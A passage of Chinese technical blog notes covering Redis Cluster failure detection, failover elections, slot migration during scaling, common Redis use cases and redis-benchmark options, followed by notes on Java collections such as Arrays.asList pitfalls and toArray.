<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def get_wanted():</span><br><span class="line">	int total_size &#x3D; size(cluster.nodes) </span><br><span class="line">	# 默认包含节点总量的1&#x2F;10 594 </span><br><span class="line">	int wanted &#x3D; floor(total_size&#x2F;10); </span><br><span class="line">	if wanted &lt; 3: </span><br><span class="line">		# 至少携带3个其他节点信息 </span><br><span class="line">		wanted &#x3D; 3; </span><br><span class="line">	if wanted &gt; total_size -2 : </span><br><span class="line">		# 最多包含total_size - 2个 </span><br><span class="line">		wanted &#x3D; total_size - 2; </span><br><span class="line">	return wanted;</span><br></pre></td></tr></table></figure>

<h1 id="25-Redis-集群如何进行故障迁移"><a href="#25-Redis-集群如何进行故障迁移" class="headerlink" title="25. Redis 集群如何进行故障迁移"></a>25. Redis 集群如何进行故障迁移</h1><p>当集群内少量节点出现故障时通过自动故障转移保证集群可以正常对外提供服务</p>
<h2 id="故障发现"><a href="#故障发现" class="headerlink" title="故障发现"></a>故障发现</h2><p>Redis 集群内节点通过 ping/pong 消息实现节点通信，消息不但可以传播节点槽信息，还可以传播其他状态如：主从状态、节点故障等。因此故障发现也是通过消息传播机制实现的，主要环节包括：主观下线（pfail）和客观下线（fail）</p>
<ul>
<li>主观下线：指某个节点认为另一个节点不可用，即下线状态，这个状态并不是最终的故障判定，只能代表一个节点的意见，可能存在误判情况。</li>
<li>客观下线：指标记一个节点真正的下线，集群内多个节点都认为该节点不可用，从而达成共识的结果。如果是持有槽的主节点故障，需要为该节点进行故障转移。</li>
</ul>
<h3 id="主观下线"><a href="#主观下线" class="headerlink" title="主观下线"></a>主观下线</h3><p>集群中每个节点都会定期向其他节点发送 ping 消息，接收节点回复 pong 消息作为响应。如果在 <code>cluster-node-timeout</code> 时间内通信一直失败，则发送节点会认为接收节点存在故障，把接收节点标记为主观下线（pfail）状态。</p>
<p>具体流程：</p>
<ol>
<li>节点 a 发送 ping 消息给节点 b，如果通信正常将接收到 pong 消息，节点 a 更新最近一次与节点 b 的通信时间。</li>
<li>如果节点 a 与节点 b 通信出现问题则断开连接，下次会进行重连。如果一直通信失败，则节点 a 记录的与节点 b 最后通信时间将无法更新。</li>
<li>节点 a 内的定时任务检测到与节点 b 最后通信时间超过 <code>cluster-node-timeout</code> 时，更新本地对节点 b 的状态为主观下线（pfail）。</li>
</ol>
<h3 id="客观下线"><a href="#客观下线" class="headerlink" title="客观下线"></a>客观下线</h3><p>当某个节点判断另一个节点主观下线后，相应的节点状态会跟随消息在集群内传播。ping/pong 消息的消息体会携带集群 1/10 的其他节点状态数据，当接受节点发现消息体中含有主观下线的节点状态时，会在本地找到故障节点的 <code>ClusterNode</code> 结构，保存到下线报告链表中。结构如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct clusterNode &#123; &#x2F;* 认为是主观下线的clusterNode结构 *&#x2F; </span><br><span class="line">	list *fail_reports; &#x2F;* 记录了所有其他节点对该节点的下线报告 *&#x2F; </span><br><span class="line">	... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>通过 Gossip 消息传播，集群内节点不断收集到故障节点的下线报告。当半数以上持有槽的主节点都标记某个节点是主观下线时，触发客观下线流程。</p>
<p>集群模式下只有处理槽的主节点才负责读写请求和集群槽等关键信息维护，而从节点只进行主节点数据和状态信息的复制。所以必须是负责槽的主节点参与故障发现决策</p>
<p>客观下线流程：</p>
<ol>
<li>当消息体内含有其他节点的 pfail 状态会判断发送节点的状态，如果发送节点是主节点则对报告的 pfail 状态处理，从节点则忽略。</li>
<li>找到 pfail 对应的节点结构，更新 clusterNode 内部下线报告链表。</li>
<li>根据更新后的下线报告链表告尝试进行客观下线。</li>
</ol>
<h4 id="下线报告链表"><a href="#下线报告链表" class="headerlink" title="下线报告链表"></a>下线报告链表</h4><p>每个 ClusterNode 结构中都会存在一个下线链表结构，保存了其他主节点针对当前节点的下线报告：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct clusterNodeFailReport &#123; </span><br><span class="line">	struct clusterNode *node; &#x2F;* 报告该节点为主观下线的节点 *&#x2F; </span><br><span class="line">	mstime_t time; &#x2F;* 最近收到下线报告的时间 *&#x2F; </span><br><span class="line">&#125; clusterNodeFailReport;</span><br></pre></td></tr></table></figure>

<p>下线报告中保存了报告故障的节点结构和最近收到下线报告的时间，当接收到 fail 状态时，会维护对应节点的下线上报链表。每个下线报告都存在有效期，每次在尝试触发客观下线时，都会检测下线报告是否过期，对于过期的下线报告将被删除。如果在 <code>cluster-node-time*2</code> 的时间内该下线报告没有得到更新则过期并删除.</p>
<h4 id="尝试客观下线"><a href="#尝试客观下线" class="headerlink" title="尝试客观下线"></a>尝试客观下线</h4><p>集群中的节点每次接收到其他节点的 pfail 状态，都会尝试触发客观下线：</p>
<ol>
<li>首先统计有效的下线报告数量，如果小于集群内持有槽的主节点总数的一半则退出。</li>
<li>当下线报告大于槽主节点数量一半时，标记对应故障节点为客观下线状态。</li>
<li>向集群广播一条 fail 消息，通知所有的节点将故障节点标记为客观下线，fail 消息的消息体只包含故障节点的ID。</li>
</ol>
<p>广播 fail 消息有一下两个作用：</p>
<ul>
<li>通知集群内所有的节点标记故障节点为客观下线状态并立即生效</li>
<li>通知故障节点的从节点触发故障转移流程</li>
</ul>
<h2 id="故障恢复"><a href="#故障恢复" class="headerlink" title="故障恢复"></a>故障恢复</h2><p>故障节点变为客观下线后，如果下线节点是持有槽的主节点，则需要在它的从节点中选出一个替换它，从而保证集群的高可用。下线主节点的所有从节点承担故障恢复的义务，当从节点通过内部定时任务发现自身复制的主节点进入客观下线时，将会触发故障恢复流程：</p>
<ul>
<li>资格检查</li>
<li>准备选举时间</li>
<li>发起选举</li>
<li>选举投票</li>
<li>替换主节点</li>
<li>资格检查</li>
</ul>
<h3 id="资格检查"><a href="#资格检查" class="headerlink" title="资格检查"></a>资格检查</h3><p>每个从节点都要检查最后与主节点断线时间，判断是否有资格替换故障的主节点。如果从节点与主节点断线时间超过 <code>cluster-node-time*cluster-slave-validity-factor</code>，则当前从节点不具备故障转移资格。参数<code>cluster-slavevalidity-factor</code>用于从节点的有效因子，默认为10。</p>
<h3 id="准备选举时间"><a href="#准备选举时间" class="headerlink" title="准备选举时间"></a>准备选举时间</h3><p>当从节点符合故障转移资格后，更新触发故障选举的时间，只有到达该时间后才能执行后续流程。故障选举时间相关字段如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct clusterState &#123; </span><br><span class="line">	... </span><br><span class="line">	mstime_t failover_auth_time; &#x2F;* 记录之前或者下次将要执行故障选举时间 *&#x2F; </span><br><span class="line">	int failover_auth_rank; &#x2F;* 记录当前从节点排名 *&#x2F; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>采用延迟触发机制，主要是通过对多个从节点使用不同的延迟选举时间来支持优先级问题。复制偏移量越大说明从节点延迟越低，那么它应该具有更高的优先级来替换故障主节点。</p>
<p><img src="https://github.com/xiao-ming9/xiao-ming9.github.io/blob/master/images/redis%E9%80%89%E4%B8%BE%E5%BB%B6%E8%BF%9F%E5%87%BA%E5%8F%91%E6%9C%BA%E5%88%B6.png?raw=true" alt="准备选举时间"></p>
<h3 id="发起选举"><a href="#发起选举" class="headerlink" title="发起选举"></a>发起选举</h3><p>当从节点定时任务检测到达故障选举时间（failover_auth_time）到达后，发起选举流程如下：</p>
<h3 id="更新配置纪元："><a href="#更新配置纪元：" class="headerlink" title="更新配置纪元："></a>更新配置纪元：</h3><p>配置纪元是一个只增不减的整数，每个主节点自身维护一个配置纪元（clusterNode.configEpoch）标示当前主节点的版本，所有主节点的配置纪元都不相等，从节点会复制主节点的配置纪元。整个集群又维护一个全局的配置纪元（clusterState.current Epoch），用于记录集群内所有主节点配置纪元的最大版本。执行 cluster info 命令可以查看配置纪元信息。配置纪元会跟随 ping/pong 消息在集群内传播，当发送方与接收方都是主节点且配置纪元相等时代表出现了冲突，nodeId 更大的一方会递增全局配置纪元并赋值给当前节点来区分冲突。</p>
<p>配置纪元的主要作用：</p>
<ul>
<li>标示集群内每个主节点的不同版本和当前集群最大的版本。</li>
<li>每次集群发生重要事件时，这里的重要事件指出现新的主节点（新加入的或者由从节点转换而来），从节点竞争选举。都会递增集群全局的配置纪元并赋值给相关主节点，用于记录这一关键事件。</li>
<li>主节点具有更大的配置纪元代表了更新的集群状态，因此当节点间进行ping/pong消息交换时，如出现slots 等关键信息不一致时，以配置纪元更大的一方为准，防止过时的消息状态污染集群。</li>
<li>从节点每次发起投票时都会自增集群的全局配置纪元，并单独保存在 <code>clusterState.failover_auth_epoch</code> 变量中用于标识本次从节点发起选举的版本。</li>
</ul>
<h3 id="广播选举消息"><a href="#广播选举消息" class="headerlink" title="广播选举消息"></a>广播选举消息</h3><p>在集群内广播选举消息（FAILOVER_AUTH_REQUEST），并记录已发送过消息的状态，保证该从节点在一个配置纪元内只能发起一次选举。消息内容如同 ping 消息只是将 type 类型变为 FAILOVER_AUTH_REQUEST。</p>
<h3 id="选举投票"><a href="#选举投票" class="headerlink" title="选举投票"></a>选举投票</h3><p>只有持有槽的主节点才会处理故障选举消息（FAILOVER_AUTH_REQUEST），因为每个持有槽的节点在一个配置纪元内都有唯一的一张选票，当接到第一个请求投票的从节点消息时回复 FAILOVER_AUTH_ACK 消息作为投票，之后相同配置纪元内其他从节点的选举消息将忽略。</p>
<p>当从节点收集到 <code>N/2 + 1</code> 个持有槽的主节点投票时，从节点可以执行替换主节点操作。</p>
<ul>
<li>投票作废：每个配置纪元代表了一次选举周期，如果在开始投票之后的 <code>cluster-node-timeout * 2</code> 时间内从节点没有获取足够数量的投票，则本次选举作废。从节点对配置纪元自增并发起下一轮投票，直到选举成功为止。</li>
</ul>
<h3 id="替换主节点"><a href="#替换主节点" class="headerlink" title="替换主节点"></a>替换主节点</h3><p>当前从节点取消复制变为主节点。</p>
<p>执行 clusterDelSlot 操作撤销故障主节点负责的槽，并执行 clusterAddSlot 把这些槽委派给自己。<br>向集群广播自己的 pong 消息，通知集群内所有的节点当前从节点变为主节点并接管了故障主节点的槽信息。</p>
<h1 id="26-Redis-集群伸缩（增加节点、删除节点）"><a href="#26-Redis-集群伸缩（增加节点、删除节点）" class="headerlink" title="26. Redis 集群伸缩（增加节点、删除节点）"></a>26. Redis 集群伸缩（增加节点、删除节点）</h1><p>集群的伸缩包括新节点的加入和旧节点退出。</p>
<p>新节点时加入时，我们需要把一部分数据迁移到新节点来达到集群的负载均衡，旧节点退出时，我们需要把其上的数据迁移到其他节点上，确保该节点上的数据能够被正常访问。</p>
<p>我们发现集群伸缩的核心其实是数据的迁移，而在 Redis 集群中，数据是以 slot 为单位的，那么也就是说，Redis 集群的伸缩本质上是 slot 在不同机器节点间的迁移。同时，要实现扩缩容，我们不仅需要解决数据迁移，我们还需要解决数据路由问题。比如 A 节点正在向 B 节点迁移 slot1 的数据，在未完成迁移时，slot1 中的一部分数据存在节点A上，一部分数据存在节点B上。那么以下三种情况下我们该如何路由 slot1 的客户端请求？</p>
<ol>
<li>当除了 A、B 之外的其他节点接收到 slot1 的数据请求时，其他节点该路由给哪个节点？</li>
<li>当节点 A 接收到 slot1 的数据请求时，A 该自己处理还是路由给 B 节点？</li>
<li>当节点 B 接收到 slot1 的数据请求时，B 该自己处理还是路由给A节点？</li>
</ol>
<h2 id="集群扩容"><a href="#集群扩容" class="headerlink" title="集群扩容"></a>集群扩容</h2><p>Redis集群加入新节点主要分为如下几步：</p>
<ol>
<li>准备新节点</li>
<li>加入集群</li>
<li>迁移slot到新节点。</li>
</ol>
<p>即首先启动一个集群模式下的 Redis 节点，然后通过与任意一个集群中的节点握手使得新的节点加入集群，最后再向新的节点分配它负责的 slot 以及向其迁移 slot 对应的数据。由于 Redis 采用 Gossip 协议，所以可以让新节点与任意一个现有集群节点握手，一段时间后整个集群都会知道新节点的加入。</p>
<p>例如我们向该集群中新加入一个节点 6385。由于我们要追求负载均衡，所以加入后四个节点每个节点负责 4096 个slots，但是集群中原来的每个节点都负责 5462 个slots，所以 6379、6380、6381 节点都需要向新的节点 6385 迁移 1366 个slots。需要说明的是，Redis 集群并没有一个自动实现负载均衡的工具，把多少 slots 从哪个节点迁移到哪个节点完全是由用户自己来指定的。</p>
<p><img src="http://qiniu.xiaoming.net.cn/Redis%E9%9B%86%E7%BE%A4%E6%95%B0%E6%8D%AE%E8%BF%81%E7%A7%BB.jpg" alt="Redis集群数据迁移"></p>
<h3 id="设置节点迁入迁出状态——解决路由困境"><a href="#设置节点迁入迁出状态——解决路由困境" class="headerlink" title="设置节点迁入迁出状态——解决路由困境"></a>设置节点迁入迁出状态——解决路由困境</h3><p>每个 Redis 集群节点的 clusterState 都会存储整个集群中 slot 和 Redis 节点的对应关系用于路由。当 6379 迁移 slot1 时，会首先标级该槽属于正在迁移的状态 IMGRATING，而同样 6385 也需要标记 slot1 属于正在导入的状态 IMPORTING。从实现上看，就是分别设置 <code>migrating_slots_to</code> 和 <code>importing_slots_from</code> 两个数组的对应 <code>index</code> 的值。迁入迁出的状态设置主要是为了方便数据路由的实现。在未完成迁移之前，集群中的所有节点都会将 slot1 的请求重定向到6379节点。</p>
<p>而当 6379 把 <code>slot1</code> 标记为MIGRATING时，该节点会接收所有关于 <code>slot1</code> 的请求，但只有当请求中的 <code>key</code> 存在于 6379 中时该节点才会处理该请求。否则 6379 会把该请求通过 ASK 重定向到 slot1 的迁移目标节点，即 6385 节点。</p>
<p>而当 6385 把 slot1 标记为 <code>IMPORTING</code> 时，该节点也可以接受关于 slot1 的请求，但前提是该请求中必须包含 <code>ASKING</code> 命令。如果关于 slot1 的请求中没有 <code>ASKING</code> 命令，那么 6385 节点会把该请求通过 <code>MOVED</code> 重定向到 6379 节点。</p>
<p>这样我们就解决了上述的三个问题，即：</p>
<ol>
<li>当除了 A、B 之外的其他节点接收到 slot1 的数据请求时，其他节点该路由给 A 节点</li>
<li>当节点A接收到 slot1 的数据请求时，如果请求的key存在，那么就会处理，不存在就会ASK重定向到B</li>
<li>当节点B接收到 slot1 的数据请求时，如果请求中有 ASKING 命令，那么就会自己处理。如果没有，那么重定向到 A。</li>
</ol>
<p>当迁移 slot1 结束后，slot1 就不再由 6379 负责而是交给 6385 节点负责。但是从其他节点的视角看，slot1 仍然由 6379 节点负责，他们接收到关于 slot1 的键的请求还是会路由到 6379 节点。所以迁移结束之后我们要向集群广播 slot1 由 6385 节点负责的消息，这样每个节点都会更新内部的路由数据，之后就可以正确的把 slot1 的键的请求路由到 6385 节点。需要说明的是，我们可以把上述的更新信息只告诉一个节点，那么随着各个节点信息的交换，一段时间后整个集群的所有节点都会更新路由。但是这样显然更新的延迟会很高，那些还没来得及更新的节点仍然会错误的把 slot1 的请求路由给 6379 节点。所以我们需要向每个节点进行广播消息。</p>
<h2 id="集群收缩"><a href="#集群收缩" class="headerlink" title="集群收缩"></a>集群收缩</h2><p>集群收缩即让其中一些节点安全下线。所谓的安全下线指的是让一个节点下线之前我们需要把其负责的所有 slots 迁移到别的节点，否则该节点下线后其负责的 slots 就没法继续被服务了。节点下线的流程如下图所示：</p>
<p><img src="http://qiniu.xiaoming.net.cn/Redis%E9%9B%86%E7%BE%A4%E8%8A%82%E7%82%B9%E5%AE%89%E5%85%A8%E4%B8%8B%E7%BA%BF.jpg" alt="Redis集群节点安全下线"></p>
<p>在上面的扩容完成后，集群中共有四个节点：6379、6380、6381、6385，我们以下线 6381 为例介绍下线的流程。下线 6381 节点首先需要把其上负责 slots 的数据分别迁移到三个节点上，然后通知所有集群中的节点忘记 6381 节点，最后 6381 节点关闭下线。</p>
<p>Redis 的元数据在每个节点中都有一份，即每个 Redis 节点维护者从它的视角看过去集群中所有其他节点的状态。那么当集群中的所有其他节点接收到 <code>CLUSTER FORGET &lt;NODE ID&gt;</code> 命令时会删除自己保存的 <code>NODE_ID</code> 对应的节点的状态，同时把 <code>NODE_ID</code> 对应的节点加入到黑名单中 60s。把一个节点放入黑名单意味着其他节点不会再去更新自己维护的该节点的信息，也就意味着当我们向集群中的所有节点发送<code>CLUSTER FORGET 6381</code> 后，6381节点 60s 内不能再次加入集群中。至此就完成了集群的缩容。</p>
<h1 id="27-Redis应用场景"><a href="#27-Redis应用场景" class="headerlink" title="27. Redis应用场景"></a>27. Redis应用场景</h1><h2 id="热点数据"><a href="#热点数据" class="headerlink" title="热点数据"></a>热点数据</h2><p>存取数据优先从 Redis 操作，如果不存在再从文件（例如 MySQL）中操作，从文件操作完后将数据存储到 Redis 中并返回。同时有个定时任务后台定时扫描 Redis 的 key，根据业务规则进行淘汰，防止某些只访问一两次的数据一直存在 Redis 中。</p>
<p>例如使用 Zset 数据结构，存储 Key 的访问次数/最后访问时间作为 Score，最后做排序，来淘汰那些最少访问的 Key。</p>
<h2 id="会话维持-Session"><a href="#会话维持-Session" class="headerlink" title="会话维持 Session"></a>会话维持 Session</h2><p>会话维持 Session 场景，即使用 Redis 作为分布式场景下的登录中心存储应用。每次不同的服务在登录的时候，都会去统一的 Redis 去验证 Session 是否正确。但是在微服务场景，一般会考虑 Redis + JWT 做 Oauth2 模块。</p>
<p>其中 Redis 存储 JWT 的相关信息主要是留出口子，方便以后做统一的防刷接口，或者做登录设备限制等。</p>
<h2 id="分布式锁-SETNX"><a href="#分布式锁-SETNX" class="headerlink" title="分布式锁 SETNX"></a>分布式锁 SETNX</h2><p>命令格式：<code>SETNX key value</code>：当且仅当 key 不存在，将 key 的值设为 value。若给定的 key 已经存在，则 SETNX 不做任何动作。</p>
<p>超时时间设置：获取锁的同时，启动守护线程，使用 <code>expire</code> 进行定时更新超时时间。如果该业务机器宕机，守护线程也挂掉，这样也会自动过期。如果该业务不是宕机，而是真的需要这么久的操作时间，那么增加超时时间在业务上也是可以接受的，但是肯定有个最大的阈值。</p>
<p>但是为了增加高可用，需要使用多台 Redis，就增加了复杂性，就可以参考 Redlock：Redlock分布式锁</p>
<h2 id="表缓存"><a href="#表缓存" class="headerlink" title="表缓存"></a>表缓存</h2><p>Redis 缓存表的场景有黑名单、禁言表等。访问频率较高，即读高。根据业务需求，可以使用后台定时任务定时刷新 Redis 的缓存表数据。</p>
<h2 id="消息队列-list"><a href="#消息队列-list" class="headerlink" title="消息队列 list"></a>消息队列 list</h2><p>主要使用了 List 数据结构。</p>
<p>List 支持在头部和尾部操作，因此可以实现简单的消息队列。</p>
<ul>
<li>发消息：在 List 尾部塞入数据。</li>
<li>消费消息：在 List 头部拿出数据。</li>
</ul>
<p>同时可以使用多个 List，来实现多个队列，根据不同的业务消息，塞入不同的 List，来增加吞吐量。</p>
<h2 id="计数器-string"><a href="#计数器-string" class="headerlink" title="计数器 string"></a>计数器 string</h2><p>主要使用了 INCR、DECR、INCRBY、DECRBY 方法。</p>
<p>INCR key：给 key 的 value 值增加一 DECR key：给 key 的 value 值减去一</p>
<h1 id="28-Redis-压力测试"><a href="#28-Redis-压力测试" class="headerlink" title="28. Redis 压力测试"></a>28. Redis 压力测试</h1><p>Redis 自带了一个叫 <code>redis-benchmark</code> 的工具来模拟 N 个客户端同时发出 M 个请求。 （类似于 Apache ab 程序）。你可以使用 <code>redis-benchmark -h</code> 来查看基准参数。</p>
<p>参数:</p>
<table>
<thead>
<tr>
<th align="left">选项</th>
<th align="left">描述</th>
<th align="left">默认值</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-h</td>
<td align="left">指定redis server 主机名</td>
<td align="left">localhost</td>
</tr>
<tr>
<td align="left">-p</td>
<td align="left">指定redis 服务端口</td>
<td align="left">6379</td>
</tr>
<tr>
<td align="left">-s</td>
<td align="left">指定服务器socket</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">-c</td>
<td align="left">clients,代表客户端并发连接数</td>
<td align="left">50</td>
</tr>
<tr>
<td align="left">-n</td>
<td align="left">指定请求数</td>
<td align="left">10000</td>
</tr>
<tr>
<td align="left">-d</td>
<td align="left">以字节形式指定SET/GET值的数值大小</td>
<td align="left">2</td>
</tr>
<tr>
<td align="left">-k</td>
<td align="left">1 = keepalive 0 = reconnect</td>
<td align="left">1</td>
</tr>
<tr>
<td align="left">-r</td>
<td align="left">向 redis 中插入更多的键。-r 选项会在键名上加一个12位的后缀，<code>-r 10000</code> 表示只对后四位做随机处理，SET/GET/INCR 使用随机 key, SADD 使用随机值</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">-P</td>
<td align="left">通过管道传输 <code>&lt;numreq&gt;</code> 请求</td>
<td align="left">1</td>
</tr>
<tr>
<td align="left">-q</td>
<td align="left">强制退出 redis.仅显示 query per sec 信息</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">-csv</td>
<td align="left">以 csv 格式输出</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">-l</td>
<td align="left">生成循环 永久执行测试</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">-t</td>
<td align="left">对指定命令做基准测试，仅运行以逗号分隔的测试命令列表</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">-I</td>
<td align="left">Idle模式,仅打开 N 个 idle 连接并等待</td>
<td align="left"></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java集合</title>
    <url>/2021/01/02/java%E9%9B%86%E5%90%88%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="Collection"><a href="#Collection" class="headerlink" title="Collection"></a>Collection</h1><h2 id="collection接口"><a href="#collection接口" class="headerlink" title="collection接口"></a>collection接口</h2><p>Collection接口是list，set接口的上级接口；而Map是键值对映射容器，不是Collection接口的下级接口，不同于Set和list只存储元素</p>
<h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><h4 id="迭代器模式"><a href="#迭代器模式" class="headerlink" title="迭代器模式"></a>迭代器模式</h4><p><code>collection</code>继承了<code>Iterable</code>接口，其中<code>iterator()</code>方法能够产生一个<code>Iterator</code>对象，通过这个对象可以迭代遍历<code>Collection</code>中的元素。</p>
<p>每一次调用<code>Iterable</code>的<code>Iterator()</code>方法，都会返回一个<strong>从头开始</strong>的<code>Iterator</code>对象，各个<code>Iterator</code>对象之间不会相互干扰，这样保证了可以同时对一个数据结构进行多个遍历。</p>
<a id="more"></a>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">arrayList.add(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">arrayList.add(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">Iterator&lt;String&gt; iterator = arrayList.iterator();</span><br><span class="line"><span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">    System.out.println(iterator.next());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h4><p><code>java.util.Arrays.asList()</code>可以把数组类型转化为<code>List</code>类型。</p>
<h3 id="Arrays-asList"><a href="#Arrays-asList" class="headerlink" title="Arrays.asList()"></a>Arrays.asList()</h3><p>基于数组和集合API之间的桥梁,返回List集合是属于<code>java.util.Arrays</code>的一个内部类，与<code>Collection.toArray()</code>结合使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//只是继承AbstractList接口，对于接口方法只是抛出异常UnsupportedOperationException</span></span><br><span class="line"><span class="comment">//而该内部类并没有对其继承的方法进行重写</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">List&lt;T&gt; <span class="title">asList</span><span class="params">(T... a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;&gt;(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用注意"><a href="#使用注意" class="headerlink" title="使用注意"></a>使用注意</h4><p><strong>1、传递的数组必须是对象数组，而不是基本类型</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>[] myArray = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;;</span><br><span class="line">List myList = Arrays.asList(myArray);</span><br><span class="line">System.out.println(myList.size());<span class="comment">//1</span></span><br><span class="line">System.out.println(myList.get(<span class="number">0</span>));<span class="comment">//数组地址值</span></span><br><span class="line">System.out.println(myList.get(<span class="number">1</span>));<span class="comment">//报错：ArrayIndexOutOfBoundsException</span></span><br><span class="line"><span class="keyword">int</span> [] array=(<span class="keyword">int</span>[]) myList.get(<span class="number">0</span>);</span><br><span class="line">System.out.println(array[<span class="number">0</span>]);<span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<p>当传入一个原生数据类型数组时，<code>Arrays.asList()</code>真正得到的参数就不是数组中的元素，而是数组对象本身！此时List的唯一元素就是这个数组，这也就解释了上面的代码</p>
<p><strong>解决</strong></p>
<p><strong>使用包装类型数组</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer[] myArray = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;;</span><br></pre></td></tr></table></figure>

<p><strong>2、使用集合的修改方法:add()、remove()、clear()会抛出异常。</strong></p>
<p><code>Arrays.asList()</code>方法返回的并不是<code>java.util.ArrayList</code>，而是<code>java.util.Arrays</code>的一个内部类,这个内部类并没有实现集合的修改方法或者说并没有重写这些方法。</p>
<p>该<code>ArrayList</code>继承了<code>AbstractList</code>，而在<code>AbstractList</code>中，这几个方法的实现就是抛出<code>UnsupportedOperationException</code>异常，该<code>ArrayList</code>并没有对这些方法进行重写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List myList = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">myList.add(<span class="number">4</span>);<span class="comment">//运行时报错：UnsupportedOperationException</span></span><br><span class="line">myList.remove(<span class="number">1</span>);<span class="comment">//运行时报错：UnsupportedOperationException</span></span><br><span class="line">myList.clear();<span class="comment">//运行时报错：UnsupportedOperationException</span></span><br></pre></td></tr></table></figure>

<p><strong>3、修改原有数组的元素，变更的list集合元素也会发生改变</strong></p>
<h4 id="如何正确的将数组转化为ArrayList"><a href="#如何正确的将数组转化为ArrayList" class="headerlink" title="如何正确的将数组转化为ArrayList"></a>如何正确的将数组转化为ArrayList</h4><ol>
<li><p>自己动手实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &lt;T&gt; <span class="function">List&lt;T&gt; <span class="title">arrayToList</span><span class="params">(<span class="keyword">final</span> T[] array)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> List&lt;T&gt; l = <span class="keyword">new</span> ArrayList&lt;T&gt;(array.length);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">final</span> T s : array)&#123;</span><br><span class="line">        l.add(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>最简便的方法（推荐）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List list = <span class="keyword">new</span> ArrayList&lt;&gt;(Arrays.asList(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>));</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用java8的Stream（推荐）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer [] myArray = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;;</span><br><span class="line">List myList = Arrays.stream(myArray).collect(Collectors.toList());</span><br><span class="line"><span class="comment">//基本类型也可以实现转换（依赖boxed的装箱操作）</span></span><br><span class="line"><span class="keyword">int</span> [] myArray2 = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;;</span><br><span class="line">List myList = Arrays.stream(myArray2).boxed().collect(Collectors.toList());</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="Collection-toArray"><a href="#Collection-toArray" class="headerlink" title="Collection.toArray()"></a>Collection.toArray()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Collection</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">Iterable</span>&lt;<span class="title">E</span>&gt;</span>&#123;</span><br><span class="line">    &lt;T&gt; T[] toArray(T[] a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法是一个泛型方法，如果方法中没有传递任何参数的话则返回一个Object数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String [] s= <span class="keyword">new</span> String[]&#123;</span><br><span class="line">    <span class="string">&quot;dog&quot;</span>, <span class="string">&quot;lazy&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;over&quot;</span>, <span class="string">&quot;jumps&quot;</span>, <span class="string">&quot;fox&quot;</span>, <span class="string">&quot;brown&quot;</span>, <span class="string">&quot;quick&quot;</span>, <span class="string">&quot;A&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line">List&lt;String&gt; list = Arrays.asList(s);</span><br><span class="line">Collections.reverse(list);</span><br><span class="line">String[] strings = list.toArray(<span class="keyword">new</span> String[<span class="number">0</span>]);</span><br><span class="line">System.out.println(Arrays.toString(strings));</span><br></pre></td></tr></table></figure>

<p>由于JVM优化，泛型擦除<code>new String[0]</code>作为<code>collection.toArray()</code>方法参数现在使用更好，<code>new String[0]</code>就是起到一个模板的作用，指定返回数组的类型，0是为了节省空间</p>
